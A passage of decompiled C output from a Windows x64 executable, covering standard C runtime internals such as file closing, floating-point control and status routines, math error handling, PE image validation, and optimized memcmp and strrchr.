        int **a3,
        int *a4)
{
  unsigned int v6; // ebx

  sub_14000AD6C(*a2);
  if ( (*(_BYTE *)(qword_14001D350[(__int64)**a3 >> 6] + ((unsigned __int64)(**a3 & 0x3F) << 6) + 56) & 1) != 0 )
  {
    v6 = close_nolock();
  }
  else
  {
    *errno() = 9;
    v6 = -1;
  }
  sub_14000AD90(*a4);
  return v6;
}


// ===== sub_14000F734 @ 0x14000f734 size=0xa1 =====
__int64 __fastcall sub_14000F734(int a1)
{
  int *v2; // [rsp+20h] [rbp-18h] BYREF
  int v3; // [rsp+40h] [rbp+8h] BYREF
  char v4; // [rsp+48h] [rbp+10h] BYREF
  int v5; // [rsp+50h] [rbp+18h] BYREF
  int v6; // [rsp+58h] [rbp+20h] BYREF

  v3 = a1;
  if ( a1 == -2 )
  {
    *_doserrno() = 0;
    *errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_14001D750
      && (*(_BYTE *)(qword_14001D350[(__int64)a1 >> 6] + ((unsigned __int64)(a1 & 0x3F) << 6) + 56) & 1) != 0 )
    {
      v5 = a1;
      v6 = a1;
      v2 = &v3;
      return __crt_seh_guarded_call<int>::operator()<_lambda_bfedae4ebbf01fab1bb6dcc6a9e276e0_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_237c231691f317818eb88cc1d5d642d6_>(
               (__int64)&v4,
               &v6,
               &v2,
               &v5);
    }
    *_doserrno() = 0;
    *errno() = 9;
    invalid_parameter_noinfo();
  }
  return 0xFFFFFFFFLL;
}


// ===== _close_nolock @ 0x14000f7d8 size=0xba =====
__int64 __fastcall close_nolock(int a1)
{
  __int64 v1; // rdi
  DWORD LastError; // ebx
  intptr_t osfhandle; // rbx
  void *v4; // rax

  v1 = a1;
  if ( get_osfhandle(a1) == -1
    || ((_DWORD)v1 == 1 && (*(_BYTE *)(qword_14001D350[0] + 184) & 1) != 0
     || (_DWORD)v1 == 2 && (*(_BYTE *)(qword_14001D350[0] + 120) & 1) != 0)
    && (osfhandle = get_osfhandle(2), get_osfhandle(1) == osfhandle)
    || (v4 = (void *)get_osfhandle(v1), CloseHandle(v4)) )
  {
    LastError = 0;
  }
  else
  {
    LastError = GetLastError();
  }
  free_osfhnd(v1);
  *(_BYTE *)(qword_14001D350[v1 >> 6] + ((unsigned __int64)(v1 & 0x3F) << 6) + 56) = 0;
  if ( LastError == 0 )
    return 0;
  _acrt_errno_map_os_error(LastError);
  return 0xFFFFFFFFLL;
}


// ===== ?__acrt_stdio_free_stream@@YAXV__crt_stdio_stream@@@Z @ 0x14000f894 size=0x42 =====
__int64 __fastcall __acrt_stdio_free_stream(__int64 a1)
{
  *(_QWORD *)a1 = 0;
  *(_QWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 24) = -1;
  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  *(_QWORD *)(a1 + 40) = 0;
  _InterlockedExchange((volatile __int32 *)(a1 + 20), 0);
  return a1;
}


// ===== _putwch_nolock @ 0x14000f8d8 size=0x59 =====
wint_t __cdecl putwch_nolock(wchar_t Character)
{
  HANDLE v1; // rcx
  wint_t Buffer; // [rsp+40h] [rbp+8h] BYREF
  DWORD NumberOfCharsWritten; // [rsp+48h] [rbp+10h] BYREF

  Buffer = Character;
  v1 = hConsoleOutput;
  if ( hConsoleOutput == (HANDLE)-2LL )
  {
    sub_140010098();
    v1 = hConsoleOutput;
  }
  if ( v1 == (HANDLE)-1LL || !WriteConsoleW(v1, &Buffer, 1u, &NumberOfCharsWritten, nullptr) )
    return -1;
  else
    return Buffer;
}


// ===== _getfpcontrolword @ 0x14000f934 size=0x17 =====
__int64 getfpcontrolword()
{
  return controlfp(0, 0) & 0x31F;
}


// ===== _getfpstatusword @ 0x14000f94c size=0x11 =====
__int64 getfpstatusword()
{
  return statusfp() & 0x1F;
}


// ===== _setfpcontrolword @ 0x14000f960 size=0xa =====
unsigned int __fastcall setfpcontrolword(unsigned int a1)
{
  return controlfp(a1, 0x8031Fu);
}


// ===== _setfpstatusword @ 0x14000f96c size=0x50 =====
__int64 __fastcall setfpstatusword(char a1)
{
  __int64 v2; // rax
  int v3; // ecx

  v2 = get_fpsr() & 0xFFFFFFC2LL;
  v3 = 0;
  if ( (a1 & 0x1F) != 0 )
  {
    v3 = (a1 & 0x10) != 0;
    if ( (a1 & 8) != 0 )
      v3 |= 4u;
    if ( (a1 & 4) != 0 )
      v3 |= 8u;
    if ( (a1 & 2) != 0 )
      v3 |= 0x10u;
    if ( (a1 & 1) != 0 )
      v3 |= 0x20u;
  }
  return set_fpsr((unsigned int)v2 | v3);
}


// ===== _clearfp @ 0x14000f9bc size=0x52 =====
unsigned int __cdecl clearfp()
{
  char fpsr; // bl
  unsigned int result; // eax

  fpsr = get_fpsr();
  fclrf();
  result = 0;
  if ( (fpsr & 0x3F) != 0 )
  {
    if ( (fpsr & 1) != 0 )
      result = 16;
    if ( (fpsr & 4) != 0 )
      result |= 8u;
    if ( (fpsr & 8) != 0 )
      result |= 4u;
    if ( (fpsr & 0x10) != 0 )
      result |= 2u;
    if ( (fpsr & 0x20) != 0 )
      result |= 1u;
    if ( (fpsr & 2) != 0 )
      result |= 0x80000u;
  }
  return result;
}


// ===== _controlfp @ 0x14000fa10 size=0x9 =====
unsigned int __cdecl controlfp(unsigned int NewValue, unsigned int Mask)
{
  unsigned int v2; // edx

  v2 = Mask & 0xFFF7FFFF;
  return common_control87(NewValue, v2);
}


// ===== _statusfp @ 0x14000fa1c size=0x48 =====
unsigned int __cdecl statusfp()
{
  char v0; // dl
  unsigned int v1; // ecx

  v0 = _mm_getcsr();
  v1 = 0;
  if ( (v0 & 0x3F) != 0 )
  {
    if ( (v0 & 1) != 0 )
      v1 = 16;
    if ( (v0 & 4) != 0 )
      v1 |= 8u;
    if ( (v0 & 8) != 0 )
      v1 |= 4u;
    if ( (v0 & 0x10) != 0 )
      v1 |= 2u;
    if ( (v0 & 0x20) != 0 )
      v1 |= 1u;
    if ( (v0 & 2) != 0 )
      v1 |= 0x80000u;
  }
  return v1;
}


// ===== common_control87 @ 0x14000fa64 size=0x296 =====
int __fastcall common_control87(int a1, int a2)
{
  int v3; // ebx
  __int16 fpsr; // r9
  int v5; // edi
  int result; // eax
  int v7; // ecx
  int v8; // r9d
  int v9; // r9d
  int v10; // ecx
  unsigned int v11; // ebx
  int v12; // eax
  int v13; // ecx
  int v14; // eax
  int v15; // ebx
  int v16; // ebx

  v3 = a2 & 0x308031F;
  fpsr = get_fpsr();
  v5 = 0;
  result = 0;
  if ( (fpsr & 0x80) != 0 )
    result = 16;
  if ( (fpsr & 0x200) != 0 )
    result |= 8u;
  if ( (fpsr & 0x400) != 0 )
    result |= 4u;
  if ( (fpsr & 0x800) != 0 )
    result |= 2u;
  if ( (fpsr & 0x1000) != 0 )
    result |= 1u;
  if ( (fpsr & 0x100) != 0 )
    result |= 0x80000u;
  v7 = fpsr & 0x6000;
  if ( (fpsr & 0x6000) != 0 )
  {
    switch ( v7 )
    {
      case 8192:
        result |= 0x100u;
        break;
      case 16384:
        result |= 0x200u;
        break;
      case 24576:
        result |= 0x300u;
        break;
      default:
        break;
    }
  }
  v8 = (fpsr & 0x8040) - 64;
  if ( v8 != 0 )
  {
    v9 = v8 - 32704;
    if ( v9 != 0 )
    {
      if ( v9 == 64 )
        result |= 0x1000000u;
    }
    else
    {
      result |= 0x3000000u;
    }
  }
  else
  {
    result |= 0x2000000u;
  }
  v10 = v3 & a1 | result & ~v3;
  if ( v10 != result )
  {
    v11 = 0;
    if ( (v10 & 0x10) != 0 )
      v11 = 128;
    if ( (v10 & 8) != 0 )
      v11 |= 0x200u;
    if ( (v10 & 4) != 0 )
      v11 |= 0x400u;
    if ( (v10 & 2) != 0 )
      v11 |= 0x800u;
    if ( (v10 & 1) != 0 )
      v11 |= 0x1000u;
    if ( (v10 & 0x80000) != 0 )
      v11 |= 0x100u;
    v12 = v10 & 0x300;
    if ( (v10 & 0x300) != 0 )
    {
      switch ( v12 )
      {
        case 256:
          v11 |= 0x2000u;
          break;
        case 512:
          v11 |= 0x4000u;
          break;
        case 768:
          v11 |= 0x6000u;
          break;
        default:
          break;
      }
    }
    v13 = v10 & 0x3000000;
    switch ( v13 )
    {
      case 16777216:
        v11 |= 0x8040u;
        break;
      case 33554432:
        v11 |= 0x40u;
        break;
      case 50331648:
        v11 |= 0x8000u;
        break;
      default:
        break;
    }
    if ( byte_14001C8D0 != 0 && (v11 & 0x40) != 0 )
    {
      set_fpsr(v11);
    }
    else
    {
      v11 &= ~0x40u;
      set_fpsr(v11);
    }
    if ( (v11 & 0x80u) != 0 )
      v5 = 16;
    if ( (v11 & 0x200) != 0 )
      v5 |= 8u;
    if ( (v11 & 0x400) != 0 )
      v5 |= 4u;
    if ( (v11 & 0x800) != 0 )
      v5 |= 2u;
    if ( (v11 & 0x1000) != 0 )
      v5 |= 1u;
    if ( (v11 & 0x100) != 0 )
      v5 |= 0x80000u;
    v14 = v11 & 0x6000;
    if ( (v11 & 0x6000) != 0 )
    {
      switch ( v14 )
      {
        case 8192:
          v5 |= 0x100u;
          break;
        case 16384:
          v5 |= 0x200u;
          break;
        case 24576:
          v5 |= 0x300u;
          break;
        default:
          break;
      }
    }
    v15 = (v11 & 0x8040) - 64;
    if ( v15 == 0 )
      return v5 | 0x2000000;
    v16 = v15 - 32704;
    if ( v16 == 0 )
      return v5 | 0x3000000;
    if ( v16 == 64 )
      return v5 | 0x1000000;
    return v5;
  }
  return result;
}


// ===== _call_matherr @ 0x14000fcfc size=0x65 =====
double __fastcall call_matherr(unsigned int a1, __int64 a2, __int64 a3, double a4, __int64 a5, double a6, __int64 a7)
{
  _QWORD v9[4]; // [rsp+20h] [rbp-38h] BYREF
  double v10; // [rsp+40h] [rbp-18h]

  LODWORD(v9[0]) = a1;
  v9[3] = a5;
  v10 = a6;
  *(double *)&v9[2] = a4;
  v9[1] = a3;
  ctrlfp(a7, 65472);
  if ( (unsigned int)_acrt_invoke_user_matherr((__int64)v9) == 0 )
    set_errno_from_matherr(a1);
  return v10;
}


// ===== _exception_enabled @ 0x14000fd64 size=0xb9 =====
_BOOL8 __fastcall exception_enabled(char a1, __int16 a2)
{
  int v3; // ebx

  v3 = a1 & 0x1F;
  if ( (a1 & 8) != 0 && (a2 & 0x80u) != 0 )
  {
    set_statfp(1);
    v3 &= ~8u;
  }
  else if ( (a1 & 4) != 0 && (a2 & 0x200) != 0 )
  {
    set_statfp(4);
    v3 &= ~4u;
  }
  else if ( (a1 & 1) != 0 && (a2 & 0x400) != 0 )
  {
    set_statfp(8);
    v3 &= ~1u;
  }
  else if ( (a1 & 2) != 0 && (a2 & 0x800) != 0 )
  {
    if ( (a1 & 0x10) != 0 )
      set_statfp(16);
    v3 &= ~2u;
  }
  if ( (a1 & 0x10) != 0 && (a2 & 0x1000) != 0 )
  {
    set_statfp(32);
    v3 &= ~0x10u;
  }
  return v3 == 0;
}


// ===== _handle_error @ 0x14000fe20 size=0x127 =====
double __fastcall handle_error(
        __int64 a1,
        int a2,
        __int64 a3,
        unsigned int a4,
        int a5,
        unsigned int a6,
        double a7,
        __int64 a8,
        int a9)
{
  BOOL v13; // eax
  __int64 v14; // xmm6_8
  __int64 v16; // [rsp+48h] [rbp-A1h] BYREF
  double v17[2]; // [rsp+50h] [rbp-99h] BYREF
  _QWORD v18[8]; // [rsp+68h] [rbp-81h] BYREF
  unsigned int v19; // [rsp+A8h] [rbp-41h]

  v16 = ctrlfp(8064, 65472);
  *(_QWORD *)&v17[1] = a3;
  *(_QWORD *)&v17[0] = a3;
  v13 = exception_enabled(a5, v16);
  v14 = a8;
  if ( !v13 )
  {
    if ( a9 == 2 )
    {
      v18[6] = a8;
      v19 = v19 & 0xFFFFFFE0 | 3;
    }
    raise_exc((unsigned int)v18, (unsigned int)&v16, a5, a2, (__int64)&a7, (__int64)v17);
  }
  if ( _acrt_has_user_matherr() && a4 != 0 )
    return call_matherr(a4, a6, a1, a7, v14, v17[0], v16);
  set_errno_from_matherr(a4);
  ctrlfp(v16, 65472);
  return v17[0];
}


// ===== __acrt_initialize_fma3 @ 0x14000ff70 size=0x70 =====
__int64 _acrt_initialize_fma3()
{
  int v0; // r8d

  v0 = 0;
  dword_14001DBA8 = 0;
  _RAX = 1;
  __asm { cpuid }
  if ( (_RCX & 0x18001000) == 0x18001000 )
  {
    __asm { xgetbv }
    v0 = dword_14001DBA8;
  }
  dword_14001DBAC = v0;
  return 0;
}


// ===== _log10_special @ 0x14000ffe0 size=0x20 =====
__int64 __fastcall log10_special(int a1, int a2, int a3)
{
  return log_special_common(a1, a2, a3, 27, (__int64)"log10");
}


// ===== _log_special_common @ 0x140010000 size=0x96 =====
// local variable allocation has failed, the output may be wrong!
__m128 __fastcall log_special_common(double a1, double a2, int a3, int a4, __int64 a5)
{
  __int128 v5; // xmm6
  int v7; // r8d
  unsigned int v8; // r9d
  int v10; // [rsp+20h] [rbp-48h]
  unsigned int v11; // [rsp+28h] [rbp-40h]
  double v12; // [rsp+30h] [rbp-38h]

  v5 = *(_OWORD *)&a2;
  v7 = a3 - 1;
  if ( v7 == 0 )
  {
    v8 = 2;
    v12 = a1;
    v11 = 34;
    v10 = 4;
    goto LABEL_5;
  }
  if ( v7 == 1 )
  {
    v8 = 1;
    v12 = a1;
    v11 = 33;
    v10 = 8;
LABEL_5:
    handle_error(a5, a4, *(__int64 *)&a2, v8, v10, v11, v12, 0, 1);
  }
  return (__m128)v5;
}


// ===== sub_140010098 @ 0x140010098 size=0x3b =====
HANDLE sub_140010098()
{
  HANDLE result; // rax

  result = CreateFileW(L"CONOUT$", 0x40000000u, 3u, nullptr, 3u, 0, nullptr);
  hConsoleOutput = result;
  return result;
}


// ===== sub_1400100D4 @ 0x1400100d4 size=0x20 =====
int sub_1400100D4()
{
  int result; // eax

  result = (_DWORD)hConsoleOutput + 2;
  if ( (unsigned __int64)hConsoleOutput + 2 > 1 )
    return CloseHandle(hConsoleOutput);
  return result;
}


// ===== _get_fpsr @ 0x140010110 size=0x10 =====
__int64 get_fpsr()
{
  return (unsigned int)_mm_getcsr();
}


// ===== _set_fpsr @ 0x140010120 size=0xa =====
void __fastcall set_fpsr(unsigned int a1)
{
  _mm_setcsr(a1);
}


// ===== _fclrf @ 0x14001012a size=0x14 =====
void fclrf()
{
  _mm_setcsr(_mm_getcsr() & 0xFFFFFFC0);
}


// ===== _return @ 0x14001015c size=0x1 =====
void return()
{
  ;
}


// ===== _raise_exc @ 0x140010160 size=0x27 =====
__int64 __fastcall raise_exc(int a1, int a2, int a3, int a4, __int64 a5, __int64 a6)
{
  return raise_exc_ex(a1, a2, a3, a4, a5, a6, 0);
}


// ===== _raise_exc_ex @ 0x140010188 size=0x306 =====
__int64 __fastcall raise_exc_ex(ULONG_PTR a1, _QWORD *a2, char a3, __int16 a4, _DWORD *a5, _DWORD *a6, int a7)
{
  DWORD v9; // edi
  char v10; // al
  __int64 v11; // rax
  _DWORD *v12; // rsi
  ULONG_PTR v13; // rcx
  __int64 result; // rax
  ULONG_PTR Arguments; // [rsp+30h] [rbp+10h] BYREF

  Arguments = a1;
  v9 = -1073741811;
  *(_DWORD *)(a1 + 4) = 0;
  *(_DWORD *)(Arguments + 8) = 0;
  *(_DWORD *)(Arguments + 12) = 0;
  if ( (a3 & 0x10) != 0 )
  {
    v9 = -1073741681;
    *(_DWORD *)(Arguments + 4) |= 1u;
  }
  if ( (a3 & 2) != 0 )
  {
    v9 = -1073741677;
    *(_DWORD *)(Arguments + 4) |= 2u;
  }
  if ( (a3 & 1) != 0 )
  {
    v9 = -1073741679;
    *(_DWORD *)(Arguments + 4) |= 4u;
  }
  if ( (a3 & 4) != 0 )
  {
    v9 = -1073741682;
    *(_DWORD *)(Arguments + 4) |= 8u;
  }
  if ( (a3 & 8) != 0 )
  {
    v9 = -1073741680;
    *(_DWORD *)(Arguments + 4) |= 0x10u;
  }
  *(_DWORD *)(Arguments + 8) ^= (*(_DWORD *)(Arguments + 8) ^ ~(16 * (*a2 >> 7))) & 0x10;
  *(_DWORD *)(Arguments + 8) ^= (*(_DWORD *)(Arguments + 8) ^ ~(8 * (*a2 >> 9))) & 8;
  *(_DWORD *)(Arguments + 8) ^= (*(_DWORD *)(Arguments + 8) ^ ~(4 * (*a2 >> 10))) & 4;
  *(_DWORD *)(Arguments + 8) ^= (*(_DWORD *)(Arguments + 8) ^ ~(2 * (*a2 >> 11))) & 2;
  *(_DWORD *)(Arguments + 8) ^= (*(_DWORD *)(Arguments + 8) ^ ~(*(_DWORD *)a2 >> 12)) & 1;
  v10 = statfp();
  if ( (v10 & 1) != 0 )
    *(_DWORD *)(Arguments + 12) |= 0x10u;
  if ( (v10 & 4) != 0 )
    *(_DWORD *)(Arguments + 12) |= 8u;
  if ( (v10 & 8) != 0 )
    *(_DWORD *)(Arguments + 12) |= 4u;
  if ( (v10 & 0x10) != 0 )
    *(_DWORD *)(Arguments + 12) |= 2u;
  if ( (v10 & 0x20) != 0 )
    *(_DWORD *)(Arguments + 12) |= 1u;
  v11 = *(_DWORD *)a2 & 0x6000LL;
  if ( v11 != 0 )
  {
    switch ( v11 )
    {
      case 8192LL:
        *(_DWORD *)Arguments &= ~2u;
        *(_DWORD *)Arguments |= 1u;
        break;
      case 16384LL:
        *(_DWORD *)Arguments &= ~1u;
        *(_DWORD *)Arguments |= 2u;
        break;
      case 24576LL:
        *(_DWORD *)Arguments |= 3u;
        break;
      default:
        break;
    }
  }
  else
  {
    *(_DWORD *)Arguments &= 0xFFFFFFFC;
  }
  *(_DWORD *)Arguments &= 0xFFFE001F;
  *(_DWORD *)Arguments |= 32 * (a4 & 0xFFF);
  v12 = a6;
  *(_DWORD *)(Arguments + 32) |= 1u;
  if ( a7 != 0 )
  {
    *(_DWORD *)(Arguments + 32) &= 0xFFFFFFE1;
    *(_DWORD *)(Arguments + 16) = *a5;
    *(_DWORD *)(Arguments + 96) |= 1u;
    *(_DWORD *)(Arguments + 96) &= 0xFFFFFFE1;
    *(_DWORD *)(Arguments + 80) = *v12;
  }
  else
  {
    *(_DWORD *)(Arguments + 32) = *(_DWORD *)(Arguments + 32) & 0xFFFFFFE1 | 2;
    *(_QWORD *)(Arguments + 16) = *(_QWORD *)a5;
    *(_DWORD *)(Arguments + 96) |= 1u;
    *(_DWORD *)(Arguments + 96) = *(_DWORD *)(Arguments + 96) & 0xFFFFFFE1 | 2;
    *(_QWORD *)(Arguments + 80) = *(_QWORD *)v12;
  }
  clrfp();
  RaiseException(v9, 0, 1u, &Arguments);
  v13 = Arguments;
  if ( (*(_BYTE *)(Arguments + 8) & 0x10) != 0 )
    *a2 &= ~0x80uLL;
  if ( (*(_BYTE *)(v13 + 8) & 8) != 0 )
    *a2 &= ~0x200uLL;
  if ( (*(_BYTE *)(v13 + 8) & 4) != 0 )
    *a2 &= ~0x400uLL;
  if ( (*(_BYTE *)(v13 + 8) & 2) != 0 )
    *a2 &= ~0x800uLL;
  if ( (*(_BYTE *)(v13 + 8) & 1) != 0 )
    *a2 &= ~0x1000uLL;
  if ( (*(_DWORD *)v13 & 3) != 0 )
  {
    switch ( *(_DWORD *)v13 & 3 )
    {
      case 1:
        *a2 &= ~0x4000uLL;
        *a2 |= 0x2000uLL;
        break;
      case 2:
        *a2 &= ~0x2000uLL;
        *a2 |= 0x4000uLL;
        break;
      case 3:
        *a2 |= 0x6000uLL;
        break;
      default:
        break;
    }
  }
  else
  {
    *a2 &= 0xFFFFFFFFFFFF9FFFuLL;
  }
  if ( a7 != 0 )
  {
    result = *(unsigned int *)(v13 + 80);
    *v12 = result;
  }
  else
  {
    result = *(_QWORD *)(v13 + 80);
    *(_QWORD *)v12 = result;
  }
  return result;
}


// ===== _set_errno_from_matherr @ 0x140010490 size=0x2e =====
int *__fastcall set_errno_from_matherr(int a1)
{
  int *result; // rax

  if ( a1 == 1 )
  {
    result = errno();
    *result = 33;
  }
  else
  {
    result = (int *)(unsigned int)(a1 - 2);
    if ( (unsigned int)result <= 1 )
    {
      result = errno();
      *result = 34;
    }
  }
  return result;
}


// ===== _clrfp @ 0x1400104c0 size=0x1d =====
__int64 clrfp()
{
  unsigned int v0; // ebx

  v0 = get_fpsr() & 0x3F;
  fclrf();
  return v0;
}


// ===== _ctrlfp @ 0x1400104e0 size=0x7c =====
__int64 __fastcall ctrlfp(int a1, int a2)
{
  unsigned int fpsr; // esi
  unsigned int v5; // ecx

  fpsr = get_fpsr();
  v5 = a2 & a1 | fpsr & (~(_WORD)a2 | 0xFFFF807F);
  if ( byte_14001C8F0 != 0 && (v5 & 0x40) != 0 )
    set_fpsr(v5);
  else
    set_fpsr(v5 & 0xFFFFFFBF);
  return fpsr;
}


// ===== _set_statfp @ 0x14001055c size=0x1f =====
void __fastcall set_statfp(char a1)
{
  int fpsr; // eax

  fpsr = get_fpsr();
  set_fpsr(a1 & 0x3F | fpsr);
}


// ===== _statfp @ 0x14001057c size=0x11 =====
__int64 statfp()
{
  return get_fpsr() & 0x3F;
}


// ===== _FindPESection @ 0x140010590 size=0x44 =====
__int64 __fastcall FindPESection(__int64 a1, unsigned __int64 a2)
{
  unsigned int v2; // r9d
  __int64 v3; // r8
  __int64 result; // rax
  unsigned __int64 v6; // rdx

  v2 = 0;
  v3 = a1 + *(int *)(a1 + 60);
  result = v3 + *(unsigned __int16 *)(v3 + 20) + 24LL;
  if ( *(_WORD *)(v3 + 6) == 0 )
    return 0;
  while ( 1 )
  {
    v6 = *(unsigned int *)(result + 12);
    if ( a2 >= v6 && a2 < (unsigned int)(v6 + *(_DWORD *)(result + 8)) )
      break;
    ++v2;
    result += 40;
    if ( v2 >= *(unsigned __int16 *)(v3 + 6) )
      return 0;
  }
  return result;
}


// ===== _IsNonwritableInCurrentImage @ 0x1400105e0 size=0x4d =====
__int64 __fastcall IsNonwritableInCurrentImage(__int64 a1)
{
  __int64 result; // rax

  result = ValidateImageBase(0x140000000uLL);
  if ( (_DWORD)result != 0 )
  {
    result = FindPESection(0x140000000LL, a1 - 0x140000000LL);
    if ( result != 0 )
      return *(int *)(result + 36) >= 0;
  }
  return result;
}


// ===== _ValidateImageBase @ 0x140010630 size=0x2d =====
_BOOL8 __fastcall ValidateImageBase(__int64 a1)
{
  __int64 v1; // rax
  _BOOL8 result; // rax

  result = false;
  if ( *(_WORD *)a1 == 23117 )
  {
    v1 = a1 + *(int *)(a1 + 60);
    if ( *(_DWORD *)v1 == 17744 && *(_WORD *)(v1 + 24) == 523 )
      return true;
  }
  return result;
}


// ===== __GSHandlerCheck @ 0x140010660 size=0x1d =====
__int64 __fastcall _GSHandlerCheck(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  _GSHandlerCheckCommon(a2, a4, *(_QWORD *)(a4 + 56));
  return 1;
}


// ===== __GSHandlerCheckCommon @ 0x140010680 size=0x5b =====
__int64 __fastcall _GSHandlerCheckCommon(__int64 a1, __int64 a2)
{
  __int64 v2; // rcx
  __int64 result; // rax

  v2 = *(unsigned int *)(*(_QWORD *)(a2 + 16) + 8LL);
  result = *(_QWORD *)(a2 + 8);
  if ( (*(_BYTE *)(v2 + result + 3) & 0xF) != 0 )
    return *(_BYTE *)(v2 + result + 3) & 0xF0;
  return result;
}


// ===== _alloca_probe @ 0x1400106f0 size=0x51 =====
unsigned __int64 __fastcall alloca_probe()
{
  unsigned __int64 result; // rax
  char *v1; // r10
  char *StackLimit; // r11
  char v3; // [rsp+18h] [rbp+8h] BYREF

  v1 = &v3 - result;
  if ( (unsigned __int64)&v3 < result )
    v1 = nullptr;
  StackLimit = (char *)NtCurrentTeb()->NtTib.StackLimit;
  if ( v1 < StackLimit )
  {
    LOWORD(v1) = (unsigned __int16)v1 & 0xF000;
    do
    {
      StackLimit -= 4096;
      *StackLimit = 0;
    }
    while ( v1 != StackLimit );
  }
  return result;
}


// ===== memcmp @ 0x140010760 size=0xc7 =====
int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size)
{
  signed __int64 v3; // rdx
  bool v4; // cf
  size_t v6; // r9
  unsigned __int64 v7; // rax
  size_t v8; // r9

  v3 = (_BYTE *)Buf2 - (_BYTE *)Buf1;
  if ( Size < 8 )
    goto mcmp30;
  for ( ; ((unsigned __int8)Buf1 & 7) != 0; --Size )
  {
    v4 = *(_BYTE *)Buf1 < *((_BYTE *)Buf1 + v3);
    if ( *(_BYTE *)Buf1 != *((_BYTE *)Buf1 + v3) )
      return -v4 - (v4 - 1);
    Buf1 = (char *)Buf1 + 1;
  }
  if ( Size >> 3 == 0 )
  {
mcmp30:
    if ( Size == 0 )
      return 0;
    while ( 1 )
    {
      v4 = *(_BYTE *)Buf1 < *((_BYTE *)Buf1 + v3);
      if ( *(_BYTE *)Buf1 != *((_BYTE *)Buf1 + v3) )
        break;
      Buf1 = (char *)Buf1 + 1;
      if ( --Size == 0 )
        return 0;
    }
    return -v4 - (v4 - 1);
  }
  v6 = Size >> 5;
  if ( Size >> 5 != 0 )
  {
    while ( 1 )
    {
      v7 = *(_QWORD *)Buf1;
      if ( *(_QWORD *)Buf1 != *(_QWORD *)((char *)Buf1 + v3) )
        break;
      v7 = *((_QWORD *)Buf1 + 1);
      if ( v7 != *(_QWORD *)((char *)Buf1 + v3 + 8) )
        goto mcmp_adjust8;
      v7 = *((_QWORD *)Buf1 + 2);
      if ( v7 != *(_QWORD *)((char *)Buf1 + v3 + 16) )
        goto mcmp_adjust16;
      v7 = *((_QWORD *)Buf1 + 3);
      if ( v7 != *(_QWORD *)((char *)Buf1 + v3 + 24) )
      {
        Buf1 = (char *)Buf1 + 8;
mcmp_adjust16:
        Buf1 = (char *)Buf1 + 8;
mcmp_adjust8:
        Buf1 = (char *)Buf1 + 8;
        break;
      }
      Buf1 = (char *)Buf1 + 32;
      if ( --v6 == 0 )
      {
        Size &= 0x1Fu;
        goto mcmp70;
      }
    }
  }
  else
  {
mcmp70:
    v8 = Size >> 3;
    if ( Size >> 3 == 0 )
      goto mcmp30;
    while ( 1 )
    {
      v7 = *(_QWORD *)Buf1;
      if ( *(_QWORD *)Buf1 != *(_QWORD *)((char *)Buf1 + v3) )
        break;
      Buf1 = (char *)Buf1 + 8;
      if ( --v8 == 0 )
      {
        Size &= 7u;
        goto mcmp30;
      }
    }
  }
  v4 = _byteswap_uint64(v7) < _byteswap_uint64(*(_QWORD *)((char *)Buf1 + v3));
  return -v4 - (v4 - 1);
}


// ===== strrchr @ 0x140010828 size=0x149 =====
char *__cdecl strrchr(const char *Str, int Ch)
{
  char *v2; // r8
  __m128i *v3; // r9
  const __m128i *v4; // rdx
  unsigned int j; // eax
  __m128i *v7; // r10
  int v8; // r9d
  __m128i v9; // xmm3
  unsigned int v10; // edx
  int i; // ecx
  unsigned int v12; // ecx
  char *v13; // rcx
  unsigned int v14; // edx
  unsigned int v15; // ecx
  char *v16; // rcx
  char *v17; // rcx
  __m128i v18; // xmm0
  unsigned __int8 v19; // zf
  int v20; // ecx

  v2 = nullptr;
  v3 = (__m128i *)Str;
  if ( Ch != 0 )
  {
    if ( dword_14001C018 >= 2 )
    {
      while ( ((unsigned __int8)v3 & 0xF) != 0 )
      {
        v17 = (char *)v3;
        if ( v3->m128i_i8[0] != Ch )
          v17 = v2;
        v2 = v17;
        if ( v3->m128i_i8[0] == 0 )
          return v17;
        v3 = (__m128i *)((char *)v3 + 1);
      }
      v18 = _mm_cvtsi32_si128((unsigned __int8)Ch);
      while ( 1 )
      {
        v20 = _mm_cmpistri(v18, *v3, 64);
        v19 = _mm_cmpistrz(v18, *v3, 64);
        if ( _mm_cmpistrc(v18, *v3, 64) )
        {
          v2 = &v3->m128i_i8[v20];
          v19 = _mm_cmpistrz(v18, *v3, 64);
        }
        if ( v19 )
          break;
        ++v3;
      }
    }
    else
    {
      v7 = (__m128i *)((unsigned __int64)Str & 0xFFFFFFFFFFFFFFF0uLL);
      v8 = -1 << ((unsigned __int8)Str & 0xF);
      v9 = _mm_shuffle_epi32(
             _mm_shufflelo_epi16(_mm_cvtsi32_si128((unsigned __int8)Ch | ((unsigned __int8)Ch << 8)), 0),
             0);
      v10 = v8 & _mm_movemask_epi8(_mm_cmpeq_epi8(v9, *(__m128i *)((unsigned __int64)Str & 0xFFFFFFFFFFFFFFF0uLL)));
      for ( i = v8
              & _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, *(__m128i *)((unsigned __int64)Str & 0xFFFFFFFFFFFFFFF0uLL)));
            i == 0;
            v10 = _mm_movemask_epi8(_mm_cmpeq_epi8(v9, *v7)) )
      {
        _BitScanReverse(&v12, v10);
        v13 = &v7->m128i_i8[v12];
        if ( v10 != 0 )
          v2 = v13;
        i = _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, *++v7));
      }
      v14 = ((i & -i) - 1) & v10;
      _BitScanReverse(&v15, v14);
      v16 = &v7->m128i_i8[v15];
      if ( v14 != 0 )
        return v16;
    }
    return v2;
  }
  else
  {
    v4 = (const __m128i *)((unsigned __int64)Str & 0xFFFFFFFFFFFFFFF0uLL);
    for ( j = (-1 << ((unsigned __int8)Str & 0xF))
            & _mm_movemask_epi8(
                _mm_cmpeq_epi8(
                  _mm_loadu_si128((const __m128i *)((unsigned __int64)Str & 0xFFFFFFFFFFFFFFF0uLL)),
                  (__m128i)0LL)); j == 0; j = _mm_movemask_epi8(_mm_cmpeq_epi8(_mm_loadu_si128(v4), (__m128i)0LL)) )
      ++v4;
    _BitScanForward(&j, j);
    return &v4->m128i_i8[j];
  }
}


// ===== _guard_dispatch_icall_nop @ 0x140010990 size=0x2 =====
